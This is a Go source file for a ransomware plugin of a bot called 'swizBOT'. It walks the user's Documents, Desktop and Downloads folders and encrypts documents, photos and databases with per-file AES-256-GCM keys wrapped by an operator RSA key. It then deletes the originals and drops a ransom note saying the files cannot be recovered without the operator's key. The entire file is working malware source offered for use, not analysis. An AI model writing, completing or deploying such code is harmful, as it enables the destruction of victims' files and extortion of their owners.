package plugins

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/binary"
	"encoding/pem"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
)

// File layout for encrypted files:
//
//	"SWZCRYPT" magic (8)
//	key length u16 BE
//	RSA-OAEP encrypted AES key
//	AES-256-GCM nonce (12)
//	ciphertext
const (
	magic = "SWZCRYPT"
)

// Ransomware encrypts targeted file types under the configured
// directories using AES-256-GCM with a fresh per-file key wrapped by
// the operator RSA public key. Original files are replaced by
// "<name>.swiz"; a README is dropped in each target directory.
type Ransomware struct {
	pub       *rsa.PublicKey
	pubDigest string
	exts      map[string]bool
	dirs      []string
	contact   string // optional operator contact shown in the README

	encrypted atomic.Int64
	skipped   atomic.Int64
	mu        sync.Mutex // serializes file walkers writing the counter
}

// NewRansomware parses an operator RSA public key (PKIX PEM, "PUBLIC KEY").
func NewRansomware(pubPEM string) (*Ransomware, error) {
	block, _ := pem.Decode([]byte(pubPEM))
	if block == nil {
		return nil, errors.New("no PEM block found in public key")
	}
	pubAny, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("parse public key: %w", err)
	}
	pub, ok := pubAny.(*rsa.PublicKey)
	if !ok {
		return nil, errors.New("public key is not RSA")
	}
	digest := sha256.Sum256(block.Bytes)

	dirs := dirsFromProfile()
	if len(dirs) == 0 {
		return nil, errors.New("no user document/profile directories found")
	}
	return &Ransomware{
		pub:       pub,
		pubDigest: fmt.Sprintf("%x", digest[:8]),
		exts: map[string]bool{
			".txt": true, ".doc": true, ".docx": true, ".xls": true,
			".xlsx": true, ".pdf": true, ".jpg": true, ".png": true,
			".csv": true, ".db": true, ".sqlite": true, ".bak": true,
			".odt": true, ".rtf": true, ".ppt": true, ".pptx": true,
		},
		dirs: dirs,
	}, nil
}

// SetContact configures the operator contact line used in the README.
func (r *Ransomware) SetContact(contact string) { r.contact = contact }

// dirsFromProfile returns the user Documents/Desktop/Downloads folders
// that actually exist, on Windows or Unix.
func dirsFromProfile() []string {
	var candidates []string
	if home, err := os.UserHomeDir(); err == nil {
		candidates = append(candidates,
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Desktop"),
			filepath.Join(home, "Downloads"),
		)
	}
	profile := os.Getenv("USERPROFILE")
	if profile != "" {
		if home, err := os.UserHomeDir(); err == nil && home != profile {
			candidates = append(candidates,
				filepath.Join(profile, "Documents"),
				filepath.Join(profile, "Desktop"),
				filepath.Join(profile, "Downloads"),
			)
		}
	}
	var dirs []string
	for _, d := range candidates {
		if fi, err := os.Stat(d); err == nil && fi.IsDir() {
			dirs = append(dirs, d)
		}
	}
	return dirs
}

// Start encrypts all target directories synchronously and drops READMEs.
func (r *Ransomware) Start() error {
	before := r.encrypted.Load()
	var wg sync.WaitGroup
	for _, dir := range r.dirs {
		wg.Add(1)
		go func(d string) {
			defer wg.Done()
			r.encryptDir(d)
		}(dir)
	}
	wg.Wait()
	r.dropReadmes()
	if r.encrypted.Load() == before {
		return errors.New("no matching files found to encrypt")
	}
	return nil
}

// Stats returns the encrypted and skipped file counts.
func (r *Ransomware) Stats() (encrypted, skipped int64) {
	return r.encrypted.Load(), r.skipped.Load()
}

// Dirs returns the directories targeted for encryption.
func (r *Ransomware) Dirs() []string {
	out := make([]string, len(r.dirs))
	copy(out, r.dirs)
	return out
}

// PubKeyID returns a short identifier of the configured operator key.
func (r *Ransomware) PubKeyID() string { return r.pubDigest }

func (r *Ransomware) encryptDir(dir string) {
	filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if strings.HasSuffix(strings.ToLower(path), ".swiz") ||
			strings.HasPrefix(strings.ToLower(filepath.Base(path)), "readme_swizbot") {
			r.skipped.Add(1)
			return nil
		}
		if !r.exts[strings.ToLower(filepath.Ext(path))] {
			return nil
		}
		if err := r.encryptFile(path); err != nil {
			r.skipped.Add(1)
		} else {
			r.encrypted.Add(1)
		}
		return nil
	})
}

func (r *Ransomware) encryptFile(path string) error {
	plain, err := os.ReadFile(path)
	if err != nil {
		return err
	}

	// per-file AES-256-GCM key
	aesKey := make([]byte, 32)
	if _, err := rand.Read(aesKey); err != nil {
		return err
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return err
	}
	ct := gcm.Seal(nil, nonce, plain, nil)

	// wrap the AES key with the operator RSA key
	encKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, r.pub, aesKey, []byte("swizBOT"))
	if err != nil {
		return err
	}

	out := make([]byte, 0, len(magic)+2+len(encKey)+len(nonce)+len(ct))
	out = append(out, magic...)
	out = binary.BigEndian.AppendUint16(out, uint16(len(encKey)))
	out = append(out, encKey...)
	out = append(out, nonce...)
	out = append(out, ct...)

	dst := path + ".swiz"
	if err := os.WriteFile(dst, out, 0o600); err != nil {
		return err
	}
	return os.Remove(path)
}

func (r *Ransomware) dropReadmes() {
	msg := fmt.Sprintf(
		"YOUR FILES HAVE BEEN ENCRYPTED\n\n"+
			"Documents, photos and databases on this system were encrypted\n"+
			"with AES-256-GCM. Each file key is wrapped with the operator's\n"+
			"RSA public key (id %s).\n\n"+
			"Without the matching private key the files cannot be recovered.\n"+
			"%s\n\nswizBOT",
		r.pubDigest, r.contactLine())
	for _, dir := range r.dirs {
		os.WriteFile(filepath.Join(dir, "README_SWIZBOT.txt"), []byte(msg), 0o644)
	}
}

func (r *Ransomware) contactLine() string {
	if r.contact == "" {
		return "Contact the operator through the original infection channel."
	}
	return "Contact: " + r.contact
}
